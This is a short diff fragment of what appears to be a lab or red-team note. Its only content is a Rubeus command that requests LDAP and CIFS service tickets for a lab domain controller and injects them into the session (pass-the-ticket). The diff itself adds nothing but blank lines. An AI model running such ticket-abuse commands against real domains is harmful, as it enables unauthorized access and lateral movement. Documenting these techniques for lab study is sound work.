@@ -15,3 +15,5 @@ updated_at: '2023-04-10T20:25:48.071449+00:00'
 ```bash
 .\Rubeus.exe asktgs /ticket:<ticket base64> /service:LDAP/dc.lab.local,cifs/dc.lab.local /ptt
 ```
+
+
